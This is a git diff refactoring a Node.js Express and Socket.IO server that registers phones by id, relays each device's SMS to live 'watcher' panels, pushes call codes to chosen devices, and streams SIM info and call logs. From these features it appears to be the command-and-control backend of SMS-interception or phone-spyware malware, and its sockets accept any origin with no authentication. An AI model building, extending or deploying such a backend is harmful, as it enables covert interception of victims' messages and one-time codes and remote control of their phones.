@@ -1,12 +1,18 @@
-// server.js
+// ================================================================
+// REALTIME SERVER – FINAL PRODUCTION VERSION (CALL + SMS + WATCH)
+// ================================================================
+
 import express from "express";
 import cors from "cors";
 import dotenv from "dotenv";
 import { createServer } from "http";
 import { Server } from "socket.io";
-import fetch from "node-fetch";
 import mongoose from "mongoose";
+import fetch from "node-fetch";
 import { connectDB } from "./config/db.js";
+
+import Sms from "./models/Sms.js";
+import { initAdminPassword } from "./controllers/authController.js";
 
 import deviceRoutes from "./routes/deviceRoutes.js";
 import smsRoutes from "./routes/smsRoutes.js";
@@ -21,294 +27,217 @@ import callLogRoutes from "./routes/callLogRoutes.js";
 import statusRoutes from "./routes/statusRoutes.js";
 import lastSeenRoutes from "./routes/lastSeen.routes.js";
 
-// ⚠ default admin password init
-import { initAdminPassword } from "./controllers/authController.js";
-
-// ✅ IMPORT SMS MODEL FOR DIRECT WATCH
-import Sms from "./models/Sms.js";
-
 dotenv.config();
 connectDB();
 
-// --------------------------------------------------
-// EXPRESS + SOCKET SETUP
-// --------------------------------------------------
+// ================================================================
+// APP + SOCKET
+// ================================================================
 const app = express();
 const server = createServer(app);
+
 const io = new Server(server, {
-  cors: { origin: "*", methods: ["GET", "POST"] },
+    cors: { origin: "*", methods: ["GET", "POST"] },
+    pingTimeout: 30000,
+    pingInterval: 10000,
 });
 
 app.use(cors());
 app.use(express.json());
 app.set("io", io);
 
-// --------------------------------------------------
-// UTILS
-// --------------------------------------------------
-function cleanId(id) {
-  if (!id) return null;
-  return id.toString().trim().toUpperCase();
-}
+// ================================================================
+// HELPERS
+// ================================================================
+const cleanId = (id) =>
+    id ? id.toString().trim().toUpperCase() : null;
 
-// active phone sockets & UI watchers
-const deviceSockets = new Map();   // uniqueid -> socketId
-const watchers = new Map();        // uniqueid -> Set<socketId>
+const deviceSockets = new Map(); // DEVICE → SOCKET
+const watchers = new Map();      // DEVICE → UI watcher sockets
 
-// send live payload to all UI listeners of that device
-function notifyWatchers(uniqueid, payload) {
-  const set = watchers.get(uniqueid);
-  if (!set) return;
-  for (let sid of set) {
-    io.to(sid).emit("deviceRealtime", payload);
-  }
-}
+const sendToWatchers = (id, payload) => {
+    const set = watchers.get(id);
+    if (!set) return;
+    for (const sid of set) io.to(sid).emit("deviceRealtime", payload);
+};
 
-// --------------------------------------------------
-// SOCKET.IO
-// --------------------------------------------------
+// ================================================================
+// SOCKET.IO LOGIC
+// ================================================================
 io.on("connection", (socket) => {
-  console.log("🟢 CONNECTED:", socket.id);
-  let currentUniqueId = null;
+    console.log("🟢 CONNECT", socket.id);
 
-  // UI → start watching a device
-  socket.on("watchDevice", (rawId) => {
-    const id = cleanId(rawId);
-    if (!id) return;
+    let deviceID = null;
 
-    if (!watchers.has(id)) watchers.set(id, new Set());
-    watchers.get(id).add(socket.id);
+    // ------------------------------------------------------------
+    // WATCH DEVICE (UI PANEL)
+    // ------------------------------------------------------------
+    socket.on("watchDevice", (rawId) => {
+        const id = cleanId(rawId);
+        if (!id) return;
 
-    console.log("👁 UI Watching:", id);
-  });
+        if (!watchers.has(id)) watchers.set(id, new Set());
+        watchers.get(id).add(socket.id);
 
-  // UI → stop watching
-  socket.on("unwatchDevice", (rawId) => {
-    const id = cleanId(rawId);
-    if (!id) return;
-    if (watchers.has(id)) watchers.get(id).delete(socket.id);
-  });
-
-  // PHONE → register itself
-  socket.on("registerDevice", (rawId) => {
-    const id = cleanId(rawId);
-    if (!id) return;
-
-    console.log("🔗 Device Registered:", id);
-
-    deviceSockets.set(id, socket.id);
-    currentUniqueId = id;
-
-    socket.join(id);
-    saveLastSeen(id, "Online");
-
-    io.to(socket.id).emit("deviceRegistered", { uniqueid: id });
-
-    io.emit("deviceListUpdated", {
-      event: "device_connected",
-      uniqueid: id,
+        console.log("👁 UI WATCH:", id);
     });
 
-    const payload = {
-      uniqueid: id,
-      connectivity: "Online",
-      updatedAt: new Date(),
-    };
+    socket.on("unwatchDevice", (rawId) => {
+        const id = cleanId(rawId);
+        watchers.get(id)?.delete(socket.id);
+    });
 
-    io.emit("deviceStatus", payload);
-    notifyWatchers(id, payload);
-  });
+    // ------------------------------------------------------------
+    // DEVICE REGISTER
+    // ------------------------------------------------------------
+    socket.on("registerDevice", (rawId) => {
+        const id = cleanId(rawId);
+        if (!id) return;
 
-  // PHONE → status heartbeat
-  socket.on("deviceStatus", (data = {}) => {
-    const id = cleanId(data.uniqueid);
-    if (!id) return;
+        deviceID = id;
+        deviceSockets.set(id, socket.id);
+        socket.join(id);
 
-    const connectivity = data.connectivity || "Online";
+        console.log("🔗 REGISTERED:", id);
 
-    console.log(`⚡ ${id} → ${connectivity}`);
-    saveLastSeen(id, connectivity);
+        io.to(socket.id).emit("deviceRegistered", { uniqueid: id });
 
-    const payload = {
-      uniqueid: id,
-      connectivity,
-      updatedAt: new Date(),
-    };
-
-    io.emit("deviceStatus", payload);
-    notifyWatchers(id, payload);
-  });
-
-  // SOCKET DISCONNECT
-  socket.on("disconnect", () => {
-    console.log("🔴 SOCKET DISCONNECTED:", socket.id);
-
-    if (currentUniqueId) {
-      const id = currentUniqueId;
-      const latestSocket = deviceSockets.get(id);
-
-      if (latestSocket === socket.id) {
-        console.log("🛑 DEVICE OFFLINE:", id);
-
-        deviceSockets.delete(id);
-        saveLastSeen(id, "Offline");
+        saveLastSeen(id, "Online");
 
         const payload = {
-          uniqueid: id,
-          connectivity: "Offline",
-          updatedAt: new Date(),
+            uniqueid: id,
+            connectivity: "Online",
+            updatedAt: new Date(),
         };
 
         io.emit("deviceStatus", payload);
+        sendToWatchers(id, payload);
+    });
 
-        io.emit("deviceListUpdated", {
-          event: "device_disconnected",
-          uniqueid: id,
-        });
+    // ------------------------------------------------------------
+    // DEVICE STATUS HEARTBEAT
+    // ------------------------------------------------------------
+    socket.on("deviceStatus", (data = {}) => {
+        const id = cleanId(data.uniqueid);
+        if (!id) return;
 
-        notifyWatchers(id, payload);
-      }
-    }
+        const payload = {
+            uniqueid: id,
+            connectivity: data.connectivity || "Online",
+            updatedAt: new Date(),
+        };
 
-    // remove this socket from all watcher sets
-    for (let [id, set] of watchers.entries()) {
-      set.delete(socket.id);
-    }
-  });
+        saveLastSeen(id, payload.connectivity);
+
+        io.emit("deviceStatus", payload);
+        sendToWatchers(id, payload);
+    });
+
+    // ------------------------------------------------------------
+    // DISCONNECT DEVICE / UI
+    // ------------------------------------------------------------
+    socket.on("disconnect", () => {
+        console.log("🔴 DISCONNECT", socket.id);
+
+        if (deviceID && deviceSockets.get(deviceID) === socket.id) {
+            deviceSockets.delete(deviceID);
+            saveLastSeen(deviceID, "Offline");
+
+            const payload = {
+                uniqueid: deviceID,
+                connectivity: "Offline",
+                updatedAt: new Date(),
+            };
+
+            io.emit("deviceStatus", payload);
+            sendToWatchers(deviceID, payload);
+        }
+
+        for (const s of watchers.values()) s.delete(socket.id);
+    });
 });
 
-// --------------------------------------------------
-// LAST SEEN SAVE (HTTP → lastseen route)
-// --------------------------------------------------
-async function saveLastSeen(uniqueid, connectivity) {
-  try {
-    const PORT = process.env.PORT || 5000;
-
-    await fetch(`http://localhost:${PORT}/api/lastseen/${uniqueid}/status`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ connectivity }),
-    });
-  } catch (err) {
-    console.log("❌ LastSeen Error:", err.message);
-  }
+// ================================================================
+// LAST SEEN
+// ================================================================
+async function saveLastSeen(id, status) {
+    try {
+        await fetch(`${process.env.BASE_URL}/api/lastseen/${id}/status`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ connectivity: status }),
+        });
+    } catch {}
 }
 
-// --------------------------------------------------
-// SEND CALL CODE TO DEVICE (used by call controller)
-// --------------------------------------------------
+// ================================================================
+// SEND CALL CODE TO DEVICE (FINAL FIX)
+// ================================================================
 export function sendCallCodeToDevice(rawId, data) {
-  const id = cleanId(rawId);
-  if (!id) return;
+    const id = cleanId(rawId);
+    if (!id) return;
 
-  console.log("📞 CALL EMIT:", id);
+    const socketId = deviceSockets.get(id);
+    if (!socketId) {
+        console.log("❌ DEVICE OFFLINE, CANNOT SEND CALL:", id);
+        return;
+    }
 
-  io.to(id).emit("callCodeUpdate", data);
-  notifyWatchers(id, { type: "call", ...data });
+    console.log("📞 CALL EMIT →", id);
+
+    io.to(socketId).emit("callCodeUpdate", data);
+    sendToWatchers(id, { type: "call", ...data });
 }
 
-// --------------------------------------------------
-// ADMIN GLOBAL BROADCAST
-// --------------------------------------------------
+// ================================================================
+// ADMIN UPDATE
+// ================================================================
 export function sendAdminGlobal(data) {
-  console.log("👑 ADMIN UPDATE:", data);
-  io.emit("adminUpdate", data);
+    io.emit("adminUpdate", data);
 }
 
-// --------------------------------------------------
-// MONGO CHANGE STREAMS
-// --------------------------------------------------
+// ================================================================
+// MONGO STREAMS
+// ================================================================
 mongoose.connection.once("open", async () => {
-  console.log("📡 Mongo Streams ACTIVE");
+    console.log("📡 MONGO STREAMS ACTIVE");
 
-  // default admin init
-  await initAdminPassword();
+    await initAdminPassword();
 
-  // generic watcher (for non-SMS collections)
-  function watch(collection, cb) {
-    const start = () => {
-      try {
-        const stream = mongoose.connection.collection(collection).watch();
-
-        stream.on("change", async (chg) => {
-          if (!["insert", "update", "replace"].includes(chg.operationType)) return;
-
-          const doc = await mongoose.connection
-            .collection(collection)
-            .findOne({ _id: chg.documentKey._id });
-
-          if (doc) cb(doc);
-        });
-
-        stream.on("error", (err) => {
-          console.log("🔥 Stream Error:", err.message);
-          console.log("🔄 Restarting stream for:", collection);
-          setTimeout(start, 2000);
-        });
-      } catch (e) {
-        console.log("🔥 Watch Init Error:", e.message);
-        setTimeout(start, 2000);
-      }
+    const watch = (name, cb) => {
+        const start = () => {
+            try {
+                const stream = mongoose.connection.collection(name).watch();
+                stream.on("change", async (chg) => {
+                    const doc = await mongoose.connection
+                        .collection(name)
+                        .findOne({ _id: chg.documentKey._id });
+                    if (doc) cb(doc);
+                });
+                stream.on("error", () => setTimeout(start, 1000));
+            } catch {
+                setTimeout(start, 1000);
+            }
+        };
+        start();
     };
 
-    start();
-  }
+    // CALL STREAM
+    watch("callcodes", (doc) => sendCallCodeToDevice(doc.uniqueid, doc));
 
-  // ---------- CALL STREAM ----------
-  watch("callcodes", (doc) => {
-    if (doc.uniqueid) {
-      console.log("📡 CALLCODE CHANGED:", doc.uniqueid);
-      sendCallCodeToDevice(doc.uniqueid, doc);
-    }
-  });
+    // SMS STREAM
+    Sms.watch().on("change", async (chg) => {
+        const doc = await Sms.findById(chg.documentKey._id).lean();
+        if (!doc?.uniqueid) return;
 
-  // ---------- SMS STREAM (FIXED – uses Sms.watch()) ----------
-  try {
-    const smsStream = Sms.watch();
-
-    smsStream.on("change", async (chg) => {
-      try {
-        if (!["insert", "update", "replace"].includes(chg.operationType)) return;
-
-        const docId = chg.documentKey && chg.documentKey._id;
-        if (!docId) return;
-
-        const doc = await Sms.findById(docId).lean();
-        if (!doc || !doc.uniqueid) return;
-
-        const id = cleanId(doc.uniqueid);
-
-        console.log("📩 SMS CHANGE:", id, "→", doc.body);
-
-        io.to(id).emit("smsUpdate", doc);
-        notifyWatchers(id, { type: "sms", ...doc });
-      } catch (e) {
-        console.log("🔥 SMS stream handler error:", e.message);
-      }
+        io.to(cleanId(doc.uniqueid)).emit("smsUpdate", doc);
+        sendToWatchers(doc.uniqueid, { type: "sms", ...doc });
     });
-
-    smsStream.on("error", (err) => {
-      console.log("🔥 SMS Stream Error:", err.message);
-    });
-  } catch (e) {
-    console.log("🔥 Sms.watch() init error:", e.message);
-  }
-
-  // ---------- ADMIN STREAM ----------
-  watch("admins", (doc) => sendAdminGlobal(doc));
-
-  // ---------- SIM INFO STREAM ----------
-  watch("siminfos", (doc) => io.emit("simInfoUpdated", doc));
-
-  // ---------- DEVICES STREAM ----------
-  watch("devices", (doc) => {
-    io.emit("deviceListUpdated", { event: "db_update", device: doc });
-  });
 });
 
-// --------------------------------------------------
+// ================================================================
 // ROUTES
-// --------------------------------------------------
+// ================================================================
 app.use("/api/device", deviceRoutes);
 app.use("/api/sms", smsRoutes);
 app.use("/api/siminfo", simInfoRoutes);
@@ -322,12 +251,8 @@ app.use("/api/lastseen", lastSeenRoutes);
 app.use("/api/call-log", callLogRoutes);
 app.use("/api/auth", authRoutes);
 
-app.get("/", (req, res) => res.send(" Real-time Backend Running"));
+app.get("/", (req, res) => res.send("Realtime Backend Running"));
 
-// --------------------------------------------------
-// START SERVER
-// --------------------------------------------------
+// ================================================================
 const PORT = process.env.PORT || 5000;
-server.listen(PORT, () => {
-  console.log(`🚀 Server Running on PORT ${PORT}`);
-});
+server.listen(PORT, () => console.log(`🚀 SERVER STARTED ON ${PORT}`));
